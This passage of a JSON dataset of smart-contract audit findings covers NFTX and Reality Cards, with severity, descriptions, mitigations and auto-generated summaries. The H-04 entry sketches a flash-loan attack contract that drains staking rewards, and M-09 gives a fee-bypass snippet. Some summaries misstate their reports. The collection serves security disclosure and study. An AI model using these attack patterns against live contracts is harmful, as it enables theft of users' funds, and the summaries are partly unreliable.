      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/44",
      "tags": [],
      "finders": []
    },
    {
      "id": "4020",
      "title": "[L-02] Missing pool existence check in balanceOf",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIn NFTXLPStaking.sol, deposit(), exit(), withdraw(), claimRewards() and other related functions that take a vaultID as parameter perform a pool existence check on the staking pool associated with that vaultID. However, balanceOf is missing a similar pool check.\n\nThis may result in returning an invalid balance of a non-existing or stale pool.\n\n\n## Proof of Concept\n\nMissing check: https://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L168-L172\n\nChecks: https://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L117\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L144\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd check require(pool.stakingToken != address(0), \"LPStaking: Nonexistent pool”); before L170.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/80",
      "tags": [],
      "finders": []
    },
    {
      "id": "4019",
      "title": "[L-01] Front-running setFees() could avoid fees",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nsetVaultFeatures() and setFees() are two separate privileged functions. Users could front-run setFees() immediately after vault is enabled in setVaultFeatures() to mint (and possibly redeem/directRedeem/swap) many tokens. The fees for mint/redeem/directRedeem/swap are not initialized so are 0 by default. This leads to loss of fee revenue.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L45-L48\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L141-L158\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L123-L139\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nSet defaults at initialization or combine this with setVaultFeatures() for atomically enabling functions and setting their fees in the same transaction.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/72",
      "tags": [],
      "finders": []
    },
    {
      "id": "4018",
      "title": "[M-09] The direct redeem fee can be circumvented",
      "impact": "MEDIUM",
      "content": "\nSince the random NFT is determined in the same transaction a payment or swap is being executed, a malicious actor can revert a transaction if they did not get the NFT they wanted. Combined with utilizing Flashbots miners which do not publish transactions which revert with `FlashbotsCheckAndSend`, there would be no cost to constantly attempting this every block or after the nonce is updated from `getPseudoRand()`.\n\n`NFTXVaultUpgradeable.sol`\n```solidity\nLine 374: uint256 tokenId = i < specificIds.length\n    ? specificIds[i]\n    : getRandomTokenIdFromFund();\n```\n\nIn this way, the `directReedemFee` can be avoided and users may lose out on potential earnings. The code below shows a transfer ownership of ERC20 tokens to attack the contract.\n```\nfunction revertIfNotSpecifiedID(uint256 targetTokenID) public {\n    NFTXVaultUpgradeable vault = NFTXVaultUpgradeable(_vault);\n    uint256[] resultID = vault.redeem(1,[]);\n    require(resultID[0] == targetTokenID);\n}\n```\n\nRecommend using a commit-reveal pattern for NFT swaps and redemptions.\n\n**[0xKiwi (NFTX) acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/71)**\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/71#issuecomment-848321831):**\n > Leaving this as medium risk as it puts user earnings into risk\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTXVaultUpgradeable.sol code that allows malicious actors to circumvent the direct redeem fee. This vulnerability has been rated as medium risk. The vulnerability is caused by the random NFT being determined in the same transaction as a payment or swap, which allows malicious actors to revert a transaction if they do not get the NFT they wanted. With the use of Flashbots miners, this can be done without incurring any cost. The impact of this vulnerability is that the directReedemFee can be avoided and users lose on potential earnings. The bug was discovered through Manual Code Review and the recommended mitigation step is to use a commit-reveal pattern for NFT swaps and redemptions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/71",
      "tags": [],
      "finders": []
    },
    {
      "id": "4017",
      "title": "[M-08] A malicious receiver can cause another receiver to lose out on distributed fees by returning false for tokensReceived when receiveRewards is called on their receiver contract.",
      "impact": "MEDIUM",
      "content": "## Handle\n\njanbro\n\n\n## Vulnerability details\n\n## Summary\nA malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when receiveRewards is called on their receiver contract.\n\n## Risk Rating\nMedium\n\n## Vulnerability Details\nA malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when receiveRewards is called on their receiver contract. This causes the fee distributor to double spend the `amountToSend` because the contract incorrectly assumes the returned data is truthful.\n\nNFTXFeeDistributor.sol\n```\nLine 163: (bool success, bytes memory returnData) = address(_receiver.receiver).call(payload);\n```\n\n## Impact\nAny subsequent receivers not receiving funds\n\n## Tools Used\nManual Code Review\n\n## Recommended Mitigation Steps\nDon't trust return data from externally called contracts. Only utilize whether the transaction succeeds to determine if the treasury fallback should be called.\n```\nLine 165: if (!success) {\n```",
      "summary": "\nThis bug report is about a vulnerability in the NFTXFeeDistributor.sol contract that allows malicious receivers to cause other receivers to lose out on distributed fees. The vulnerability occurs when the malicious receiver returns false for the tokensReceived parameter when receiveRewards is called on their receiver contract. This causes the fee distributor to double spend the amountToSend, as it incorrectly assumes the returned data is truthful. The impact of this vulnerability is that subsequent receivers may not receive funds. The risk rating for this vulnerability is medium. The vulnerability was found through manual code review, and the recommended mitigation step is to not trust return data from externally called contracts, and instead only utilize whether the transaction succeeds to determine if the treasury fallback should be called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "4016",
      "title": "[M-07] Tokens can get stuck in NFTXMintRequestEligibility",
      "impact": "MEDIUM",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nWhen dealing with ERC721 (instead of 1155) the amounts array is ignored, which leads to an issue.\n\nUser can call `NFTXMintRequestEligibility.requestMint` for an ERC721 with `amounts[i] = 0`.\nThe `ERC721.transferFrom` is still executed but user cannot `reclaimRequestedMint` later and the NFT is stuck as it checks (`amounts[i] > 0`).\n\n\n## Impact\n\nTokens can get stuck.\nAlso, subscribers to `Request` event could be tricked by specifying `amounts[i] > 1` in the ERC721 case, as only one token was transferred but the amount multiple quantities get logged.\n\n## Recommended Mitigation Steps\n\n`requestMint`: Check `amounts[i] == 1` in ERC721 case, `amounts[i] > 0` in 1155 case.",
      "summary": "\nThis bug report focuses on the ERC721 token, which is a type of Ethereum token. When the user calls the NFTXMintRequestEligibility.requestMint function for an ERC721 token, the amounts array is ignored, leading to an issue. This means that the user can call the function with amounts[i] set to 0, and the ERC721.transferFrom function is still executed, but the user cannot reclaimRequestedMint later and the token is stuck. The impact of this issue is that tokens can become stuck, and subscribers to the Request event could be tricked by specifying amounts[i] as greater than 1, as only one token is transferred but the amount multiple quantities get logged. The recommended mitigation steps are to check amounts[i] is equal to 1 in the ERC721 case and amounts[i] is greater than 0 in the 1155 case in the requestMint function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "4015",
      "title": "[M-06] Manager can grief with fees",
      "impact": "MEDIUM",
      "content": "\nThe fees in `NFTXVaultUpgradeable` can be set arbitrarily high (no restriction in `setFees`).\n\nThe manager can front-run mints and set a huge fee (for example `fee = base`) which transfers user's NFTs to the vault but doesn't mint any pool share tokens in return for the user.\n\nSimilar griefing attacks are also possible with other functions besides `mint`.\n\nRecommend checking for a max fee as a percentage of `base` (like 10%) whenever setting fees.\n\n",
      "summary": "\nThis bug report concerns the NFTXVaultUpgradeable contract, which is vulnerable to a frontrunning attack. The manager of the contract can set an arbitrarily high fee, which will transfer user’s NFTs to the vault without minting them any pool share tokens in return. This can be used to grief users of the contract. The recommended mitigation step is to check for a maximum fee as a percentage of the base whenever setting fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/51",
      "tags": [],
      "finders": []
    },
    {
      "id": "4014",
      "title": "[M-05] Unbounded iteration in NFTXEligiblityManager.distribute over _feeReceivers",
      "impact": "MEDIUM",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXEligiblityManager.distribute` iterates over all `_feeReceivers`.\n\n## Impact\n\nIf the number of `_feeReceivers` gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call `distribute` at all.\n\n## Recommended Mitigation Steps\n\nKeep the number of `_feeReceivers` small.",
      "summary": "\nThis bug report is about the NFTXEligibilityManager.distribute function, which iterates over all _feeReceivers. If the number of _feeReceivers gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call distribute at all. This could have a serious impact on the system. \n\nThe recommended mitigation step to avoid this issue is to keep the number of _feeReceivers small. This would ensure that the transaction's gas cost remains low and the block gas limit is not exceeded. This would ensure that the NFTXEligibilityManager.distribute function is able to be called without any issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/47",
      "tags": [],
      "finders": []
    },
    {
      "id": "4013",
      "title": "[M-03] Fee Distribution Re-Entrancy",
      "impact": "MEDIUM",
      "content": "\nThe `distribute` function of `NFTXFeeDistributor` has no access control and will invoke a fallback on the fee receivers, meaning that a fee receiver can re-enter via this function to acquire their allocation repeatedly potentially draining the full balance and sending zero amounts to the rest of the recipients.\n\nA smart contract with a malicious `receiveRewards` function can re-enter the `distribute` function with the same vault ID, thereby causing the exploit.\n\nRecommend that re-entrancy protection should be incorporated into the `distribute` function. I should note that a seemingly innocuous contract can cause this re-entrancy by simply asking the owners of the project to include an upgrade-able contract that is then replaced for a malicious implementation.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/11)**\n\n",
      "summary": "\nThis bug report is about the `distribute` function of the `NFTXFeeDistributor` smart contract. The function has no access control which allows a fee receiver to re-enter the function and acquire their allocation repeatedly, potentially draining the full balance and sending zero amounts to the rest of the recipients. This exploit was discovered using manual review. The recommended mitigation step is to incorporate re-entrancy protection into the `distribute` function. It should be noted that even a seemingly innocuous contract can cause this re-entrancy if the owners of the project replace it with a malicious implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/11",
      "tags": [],
      "finders": []
    },
    {
      "id": "4012",
      "title": "[M-02] Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nWhile most places use a require or safeTransfer/safeTransferFrom, there are three missing cases in the withdrawal of staking token and rescue of arbitrary tokens sent to the FeeDistributor contract.\n\nReference this similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L188\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXFeeDistributor.sol#L45\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXFeeDistributor.sol#L143\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.",
      "summary": "\nThis bug report is about a vulnerability in the NFTX Protocol V2, which can cause silent failures of token transfers and affect token accounting in contract. The vulnerability is caused by the lack of a require() statement that checks the return value of token transfers, or the use of something like OpenZeppelin’s safeTransfer/safeTransferFrom. The bug was identified through manual analysis, and the recommended mitigation step is to use safeTransfer/safeTransferFrom or require() consistently. Proof of concept can be found in the Github repository provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/79",
      "tags": [],
      "finders": []
    },
    {
      "id": "4011",
      "title": "[M-01] Randomization of NFTs returned in redeem/swap operations can be brute-forced",
      "impact": "MEDIUM",
      "content": "\nIf we assume that certain NFTs in a vault over time will have different market demand/price, then the users will try to redeem those specific NFTs. Even if direct redeems are disabled to prevent such a scenario to default to returning randomized NFTs, a user can brute-forced this on-chain randomization (using nonce + blockhash) by repeatedly trying to redeem/swap from a contract, checking the NFT IDs returned from the function and reverting the transaction if those are not the NFT IDs of specific interest.\n\nThe impact will be a subversion of the randomization goal to return random NFTs which cannot be specified by the user.\n\nA [similar exploit happened recently with Meebit NFTs](https://twitter.com/sillytuna/status/1391013965170454540).\n\nRecommend considering only EOA (external only account) for redeem/swap operations to prevent brute-forcing via contracts. Alternatively, make the user commit to pseudo-random IDs before revealing them.\n\n**- [0xKiwi acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/78) **\n\n",
      "summary": "\nThis bug report is about an exploit that can subvert the randomization goal of returning random NFTs from a vault. This exploit is possible due to the fact that a user can brute-force this on-chain randomization (using nonce + blockhash) by repeatedly trying to redeem/swap from a contract, checking the NFT IDs returned from the function and reverting the transaction if those are not the NFT IDs of specific interest. This exploit was demonstrated on Meebit NFTs, and the code for it is provided in the report.\n\nThe recommended mitigation steps are to consider onlyEOA for redeem/swap operations to prevent brute-forcing via contracts. Alternatively, the user must commit to pseudo-random IDs before revealing them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/78",
      "tags": [],
      "finders": []
    },
    {
      "id": "4010",
      "title": "[H-04] NFTXLPStaking Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault",
      "impact": "HIGH",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\nNFTXLPStaking Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault\n\n## Impact\n\nThe LPStaking contract does not require that a stake be locked for any period of time.\n\nThe LPStaking contract also does not track how long your stake has been locked.\n\nSo an attacker Alice can stake, claim rewards, and unstake, all in one transaction.\n\nIf Alice utilizes a flash loan, then she can claim nearly all of the rewards for herself, leaving very little left for the legitimate stakers.\n\nThe fact that the NFTXVaultUpgradeable contract contains a native flashLoan function makes this attack that much easier, although it would still be possible even without that due to flashloans on Uniswap, or wherever else the nftX token is found.\n\nSince a flash loan will easily dwarf all of the legitimate stakers' size of stake, the contract will erroneously award nearly all of the rewards to Alice.\n\n## Proof of Concept\n\n(1) Wait until an NFTX vault has accrued any significant amount of fees/rewards\n(2) FlashLoanBorrow a lot of ETH using any generic flash loan provider\n(3) FlashLoanBorrow a lot of nftx-vault-token using NFTXVaultUpgradeable.flashLoan()\n(4) Deposit the ETH and nftx-vault-token's into Uniswap for Uniswap LP tokens by calling Uniswap.addLiquidity()\n(5) Stake the Uniswap LP tokens in NFTXLPStaking by calling NFTXLPStaking.deposit()\n(6) Claim nearly all of the rewards that have accrued for this vault due to how large the flashLoaned deposit is relative to all of the legitimate stakes by calling NFTXLPStaking.claimRewards()\n(7) Remove LP tokens from NFTXLPStaking by calling NFTXLPStaking.exit();\n(8) Withdraw ETH and nftx-vault-token's by calling Uniswap.removeLiquidity();\n(9) Pay back nftx-vault-token flash loan\n(10) Pay back ETH flash loan\n\nHere is an example contract that roughly implements these steps in pseudocode:\n\ncontract AliceAttackContract {\n\n\n    bytes32 constant private NFTX_FLASH_LOAN_RETURN_VALUE = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n\n    uint256 largeAmountOfEther = 10_000 ether;\n\n\n    uint256 targetVaultId;\n\n\n    address targetVaultAddress;\n\n\n    // attackVaultWithId calls onEthFlashLoan(), which subsequently calls NFTX's onFlashLoan() (flashloans use a callback structure in order to revert if the flash loan is not paid back).\n\n    function attackVaultWithId(uint256 vaultId, address vaultAddress) external {\n\n        targetVaultId = vaultId;\n        targetVaultAddress = vaultAddress;\n\n        EthFlashLoanProvider.borrowFlashLoan(largeAmountOfEther); /* this calls onEthFlashLoan() in between mint and burn */\n\n    }\n\n\n    // onEthFlashLoan is called by the line EthFlashLoanProvider.borrowFlashLoan() in attackVaultWithId() (flashloans use a callback structure in order to revert if the flash loan is not paid back).\n\n    function onEthFlashLoan(...) external {\n\n        NFTXVaultUpgradeable(vaultAddress).flashLoan( /* this calls onFlashLoan() in between mint and burn */\n            address(this),\n            vaultAddress,\n            NFTXVaultUpgradeable(vaultAddress).maxFlashLoan(vaultAddress),\n            ''\n        );\n\n    }\n\n    // onFlashLoan is called by the line NFTXVaultUpgradeable.flashLoan() in onEthFlashLoan() (flashloans use a callback structure in order to revert if the flash loan is not paid back).\n    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes data) external {\n\n        UniswapRouter(uniswapRouterAddress).addLiquidity(token, etherAddress, amount, ...);\n\n        uint256 lpTokenBalance = ERC20(uniswapLPAddress).balanceOf(address(this));\n        ERC20(token).approve(nftxLpStakingAddress, lpTokenBalance);\n        NFTXLPStaking(nftxLpStakingAddress).deposit(targetVaultId, lpTokenBalance);\n\n        NFTXLPStaking(nftxLpStakingAddress).claimRewards(targetVaultId);\n\n        NFTXLPStaking(nftxLpStakingAddress).exit(targetVaultId);\n\n        UniswapRouter(uniswapRouterAddress).removeLiquidity(token, etherAddress, amount, ...);\n\n        return NFTX_FLASH_LOAN_RETURN_VALUE;\n    }\n\n}\n\n\n## Recommended Mitigation Steps\n\nRequire that staked LP tokens be staked for a particular period of time before they can be removed. Although a very short time frame (a few blocks) would avoid flash loan attacks, this attack could still be performed over the course of a few blocks less efficiently. Ideally, you would want the rewards to reflect the product of the amount staked and the duration that they've been staked, as well as having a minimum time staked.\n\nAlternatively, if you really want to allow people to have the ability to remove their stake immediately, then only allow rewards to be claimed for stakes that have been staked for a certain period of time. Users would still be able to remove their LP tokens, but they could no longer siphon off rewards immediately.",
      "summary": "\nA bug report has been submitted for the NFTXLPStaking contract, which is subject to a flash loan attack that can steal nearly all rewards/fees that have accrued for a particular vault. The LPStaking contract does not require that a stake be locked for any period of time and does not track how long a stake has been locked. This means an attacker can stake, claim rewards, and unstake in one transaction, using a flash loan to dwarf all of the legitimate stakers' size of stake and claim nearly all of the rewards for themselves. A proof of concept is provided, as well as mitigation steps to prevent this attack.\n\nThe recommended mitigation steps are to require that staked LP tokens be staked for a particular period of time before they can be removed, or to only allow rewards to be claimed for stakes that have been staked for a certain period of time. This way, users could still remove their LP tokens, but they could no longer siphon off rewards immediately.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/88",
      "tags": [],
      "finders": []
    },
    {
      "id": "4009",
      "title": "[H-03] getRandomTokenIdFromFund yields wrong probabilities for ERC1155",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXVaultUpgradeable.getRandomTokenIdFromFund` does not work with ERC1155 as it does not take the deposited `quantity1155` into account. \n\n## Impact\n\nAssume `tokenId0` has a count of 100, and `tokenId1` has a count of 1.\nThen `getRandomId` would have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.\n\nThis might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.\n\n## Recommended Mitigation Steps\n\nTake the quantities of each token into account (`quantity1155`) which probably requires a design change as it's currently hard to do without iterating over all tokens.",
      "summary": "\nA bug has been reported in the NFTXVaultUpgradeable.getRandomTokenIdFromFund function which does not take the deposited quantity1155 into account. This could lead to an attacker being able to redeem more valuable NFTs as the probabilities are off. The recommended mitigation step is to take the quantities of each token into account, which might require a design change as it is currently hard to do without iterating over all tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/56",
      "tags": [
        "ERC1155"
      ],
      "finders": []
    },
    {
      "id": "4008",
      "title": "[H-02] distribute DoS on missing receiveRewards implementation",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXEligiblityManager._sendForReceiver` should check `returnData.length == 1` before decoding, otherwise if it returns no return data, the `abi.decode` call and with it the whole `distribute` function will revert.\n\n## Impact\n\nA single badly implemented `feeReceiver` can break the whole `distribute` function and do a denial of service by reverting the transaction.\n\n## Recommended Mitigation Steps\n\nChange to: `bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));`.",
      "summary": "\nThis bug report is about an issue with the NFTXEligiblityManager._sendForReceiver function in a project. The issue is that it should check if the return data length is equal to one before decoding it, otherwise, if it returns no return data, the abi.decode call and the whole distribute function will revert. This could lead to a denial of service attack as a single badly implemented feeReceiver could break the whole distribute function by reverting the transaction. The recommended mitigation step is to change the code to bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/46",
      "tags": [],
      "finders": []
    },
    {
      "id": "4007",
      "title": "[H-01] Missing overflow check in flashLoan",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\n`ERC20FlashMintUpgradeable.flashLoan` does not check for an overflow when adding the fees to the flashloan amount.\nThe functionality might have been copied from https://eips.ethereum.org/EIPS/eip-3156 but this one already has overflow checks as it uses solidity 0.8.0.\n\n\n## Impact\n\nThis leads to an issue where the attacker does not need to pay back the flashloan as they will burn 0 tokens:\n\n```solidity\n_burn(address(receiver), amount + fee);\n```\n\nThey end up with a huge profit.\n\n> Luckily, this is currently not exploitable as the fee is set to 0 so there's no possibility to overflow. However, if governance decides to change the flashloan fee, flashloans can be taken without having to repay them.\n\n\n\n## Recommended Mitigation Steps\n\nUse SafeMath.",
      "summary": "\nA bug has been discovered in the `ERC20FlashMintUpgradeable.flashLoan` function of the Ethereum blockchain. This function does not check for an overflow when adding the fees to the flashloan amount, which could lead to an attacker taking a flashloan without having to repay it. This could result in a huge profit for the attacker. The bug is not currently exploitable as the fee is set to 0, however, if the fee is changed, the bug could be exploited. The recommended mitigation step is to use SafeMath to prevent this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "28561",
      "title": "Not optimal data type",
      "impact": "LOW",
      "content": "##### Description\nAt the line https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L42 uses an array. But with the use of structure, the code will become clearer.\n\n##### Recommendation\nIt is recommended to make a structure.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#5-not-optimal-data-type",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28560",
      "title": "Self-explainable naming",
      "impact": "LOW",
      "content": "##### Description\n\nIt's good if the name of the variable is absolutely self-explainable.\nFor primitive types (integers) it's good to know what exactly the variable is.\nFor mappings it's better to add key to the name (e.g. userDeposits not just deposits)\n\n- key and value of struct is unclear\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L38 - mappingOfMarkets\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L49 - price\n\n- add Percent postfix\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L46 - minimumPriceIncrease\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L62 - minimumPriceIncrease\n\n- add DayDivisor postfix\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L64 - minRentalDivisor\n\n- add weekDivisor postfix\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L66 - hotPotatoDivisor\n\n- rentCollected postfix\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L51\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L53\nhttps://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L55\n\n- deposit - https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCTreasury.sol#L23 what is the key?\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L37 what is the key?\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L38 what is the key?\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L39 - must be upper-cased\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L47 - what is the key?\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L48 - what is the key?\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L118 - change amicable to some common word\n\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L50 - the purpose of the value is not clear from the name\n\n##### Recommendation\nIt is recommended to rename variables.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
